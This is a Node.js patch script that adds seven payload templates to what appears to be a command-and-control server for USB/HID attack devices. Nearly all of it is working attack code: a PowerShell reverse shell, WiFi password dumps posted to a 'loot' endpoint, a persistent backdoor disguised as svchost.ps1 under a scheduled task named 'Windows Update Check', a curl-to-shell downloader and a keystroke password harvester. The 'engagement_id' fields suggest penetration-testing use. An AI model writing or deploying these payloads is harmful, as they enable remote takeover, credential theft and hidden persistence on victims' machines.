#!/usr/bin/env node
// Patch DEPLOY_TEMPLATES in server files to add 7 PAYLOAD_TEMPLATES IDs
// Run on server: node /tmp/patch-templates.js
const fs = require('fs');

const files = ['/data/server-v4.3.js', '/app/server.js'];

for (const f of files) {
  if (!fs.existsSync(f)) { console.log('SKIP: ' + f + ' not found'); continue; }
  let s = fs.readFileSync(f, 'utf-8');

  if (s.includes("ps_revshell:{")) {
    console.log('ALREADY PATCHED: ' + f);
    continue;
  }

  // Find end of keylog entry (last entry in DEPLOY_TEMPLATES)
  const keylogEnd = "croc:'MATCH .*\\nSAVE /root/udisk/loot/keys.txt\\nLED ATTACK\\n'}\n};";

  if (!s.includes(keylogEnd)) {
    console.log('ERROR: keylog marker not found in ' + f);
    // Debug: show what's around keylog
    const idx = s.indexOf('keylog:{');
    if (idx > -1) {
      console.log('Found keylog at pos ' + idx + ', context: ' + JSON.stringify(s.substring(idx + 100, idx + 200)));
    }
    continue;
  }

  const newEntries = [
    "  ps_revshell:{name:'PowerShell Reverse Shell',risk:'high',time:'10s',os:'windows',",
    "    guide:'Interaktiv PS shell. KR\\u00c6VER lytter F\\u00d8R payload: nc -lvnp 4444 p\\u00e5 C2.',",
    "    ps:'$c=New-Object Net.Sockets.TCPClient(\"__HOST__\",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+\"PS \"+(pwd).Path+\"> \");$s.Write($sb,0,$sb.Length)};$c.Close()'},",
    "  ps_exfil:{name:'PowerShell Data Exfil',risk:'medium',time:'15s',os:'windows',",
    "    guide:'Indsamler hostname, bruger, IP, WiFi credentials og sender til C2 loot.',",
    "    ps:'[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$h=hostname;$u=whoami;$r=@();netsh wlan show profiles|Select-String \"All User\"|%{$n=$_.ToString().Split(\":\")[1].Trim();$p=netsh wlan show profile name=\"$n\" key=clear|Select-String \"Key Content\";if($p){$r+=\"$n:$($p.ToString().Split(\":\")[1].Trim())\"}};Invoke-RestMethod -Uri \"https://__HOST__:__PORT__/api/d/loot\" -Method POST -Headers @{\"X-Device-Key\"=\"__KEY__\"} -Body (@{type=\"credentials\";engagement_id=__EID__;source_device=\"__DEV__\";data=\"WIFI: $($r-join \\\"; \\\")\"}|ConvertTo-Json) -ContentType \"application/json\"'},",
    "  ducky_revshell:{name:'DuckyScript Rev Shell',risk:'high',time:'10s',os:'windows',",
    "    guide:'HID payload: reverse shell via base64 PS. Kompil\\u00e9r med dk.json.',",
    "    ps:'$c=New-Object Net.Sockets.TCPClient(\"__HOST__\",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+\"PS \"+(pwd).Path+\"> \");$s.Write($sb,0,$sb.Length)};$c.Close()'},",
    "  ducky_exfil:{name:'DuckyScript WiFi Dump',risk:'low',time:'12s',os:'windows',",
    "    guide:'HID payload der dumper WiFi creds. Kompil\\u00e9r med dk.json.',",
    "    ps:'[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$r=@();netsh wlan show profiles|Select-String \"All User\"|%{$n=$_.ToString().Split(\":\")[1].Trim();$p=netsh wlan show profile name=\"$n\" key=clear|Select-String \"Key Content\";if($p){$r+=\"$n:$($p.ToString().Split(\":\")[1].Trim())\"}};Invoke-RestMethod -Uri \"https://__HOST__:__PORT__/api/d/loot\" -Method POST -Headers @{\"X-Device-Key\"=\"__KEY__\"} -Body (@{type=\"credentials\";engagement_id=__EID__;source_device=\"__DEV__\";data=\"WIFI: $($r-join \\\"; \\\")\"}|ConvertTo-Json) -ContentType \"application/json\"'},",
    "  ducky_backdoor:{name:'DuckyScript Backdoor',risk:'high',time:'12s',os:'windows',",
    "    guide:'Persistent backdoor via scheduled task. Kompil\\u00e9r med dk.json.',",
    "    ps:'[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$t=\\'$c=New-Object Net.Sockets.TCPClient(\"__HOST__\",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()\\';[IO.File]::WriteAllText(\"$env:APPDATA\\\\svchost.ps1\",$t);schtasks /create /tn \"Windows Update Check\" /tr \"powershell -w hidden -ep bypass -f %APPDATA%\\\\svchost.ps1\" /sc minute /mo 15 /f;Invoke-RestMethod -Uri \"https://__HOST__:__PORT__/api/d/loot\" -Method POST -Headers @{\"X-Device-Key\"=\"__KEY__\"} -Body (@{type=\"beacon\";engagement_id=__EID__;source_device=\"__DEV__\";data=\"BACKDOOR_INSTALLED: $(hostname) ($(whoami))\"}|ConvertTo-Json) -ContentType \"application/json\"'},",
    "  omg_ios_exfil:{name:'O.MG iOS WiFi Exfil',risk:'medium',time:'15s',os:'ios',",
    "    guide:'O.MG payload til iOS: \\u00e5bner terminal og downloader agent.',",
    "    bash:'#!/bin/bash\\ncurl -s http://__HOST__:__PORT__/agent.sh | sh'},",
    "  keycroc_harvest:{name:'Key Croc Cred Harvest',risk:'medium',time:'persistent',os:'any',",
    "    guide:'Key Croc matcher passwords og sender til C2.',",
    "    croc:'MATCH (password|passwd|pwd|login|credential)\\nQ STRING_ESC\\nSAVE /root/loot/creds_$(date +%s).txt\\ncurl -sk -X POST https://__HOST__:__PORT__/api/d/loot -H \"X-Device-Key: __KEY__\" -H \"Content-Type: application/json\" -d \"{\\\\\"type\\\\\":\\\\\"credentials\\\\\",\\\\\"engagement_id\\\\\":__EID__,\\\\\"data\\\\\":\\\\\"$(cat /root/loot/creds_*.txt | tail -1)}\"'}"
  ].join('\n');

  const replacement = "croc:'MATCH .*\\nSAVE /root/udisk/loot/keys.txt\\nLED ATTACK\\n'},\n" + newEntries + "\n};";
  s = s.replace(keylogEnd, replacement);

  fs.writeFileSync(f, s);
  console.log('PATCHED: ' + f + ' — added 7 templates');
}

console.log('Done. Restart server to apply.');
